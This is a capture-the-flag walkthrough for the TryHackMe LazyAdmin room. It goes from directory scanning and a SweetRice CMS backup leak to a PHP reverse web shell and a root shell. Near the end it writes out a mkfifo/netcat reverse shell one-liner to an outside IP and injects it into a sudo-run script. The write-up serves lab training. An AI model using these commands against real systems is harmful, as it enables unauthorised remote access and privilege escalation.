# LAzyAdmin CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **LazyAdmin** CTF challenge on [TryHackMe](https://tryhackme.com/room/lazyadmin). 
---

basic nmap scan  

![nmap](img/nmap.png "nmap")


feroxbuster found a lot of directories

```
feroxbuster -u http://IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
![fero](img/fero.png "fero")


by  checking `/content/` we know that servers uses SweetRice CMS

![content](img/content.png "content")

i checked for exploits using `searchsploit`

![exploits](img/exploits.png "exploits")

i checked `SweetRice 1.5.1 - Backup Disclosure` to gain more info

`cat /usr/share/exploitdb/exploits/php/webapps/40718.txt`

![dbexp](img/dbexp.png "dbexp")

i tested if our server has `mysql_backup` like in PoC


```
http://IP/content/inc/mysql_backup
```

![mysql](img/mysql.png "mysql")

there is `.sql` file, i checked whats inside to find something interesting

![sql](img/sql.png "sql")

i asked chatGPT to decode this particular part

![chat](img/chat.png "chat")

and we found login credentials to CMS after using crackstation to find the hash value

![login](img/login.png "login")

![manager](img/manager.png "manager")

once we are inside i found that we can implement our own code in `ads` section, so i will test this by using `php reverse webschell` from pentestmonkey

![ads](img/ads.png "ads")

now by going to `http://IP/content/inc/ads` we see our file, we can use it to test if our shell is working

![shell](img/shell.png "shell")

we successfully logged as `www-data` and got `itguy` flag

![user](img/user.png "user")

now using `sudo -l` and checking the `backup.pl` file mentioned in sudo -l

![sudol](img/sudol.png "sudol")

the script is executing another script located in `/etc/copy.sh`, sadly we cant edit backup.pl file but maybe the other file will be more helpful, the other file is writeable and already has some shell connection hmm

![copy](img/copy.png "copy")

now we need to write our own reverse shell script into `/etc/copy.sh`

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.115.41 4445 >/tmp/f" > /etc/copy.sh
```

using command to spawn a root shell


```
sudo /usr/bin/perl /home/itguy/backup.pl
```

![perl](img/perl.png "perl")

now we have root access and root flag

![root](img/root.png "root")

# MACHINE PWNED
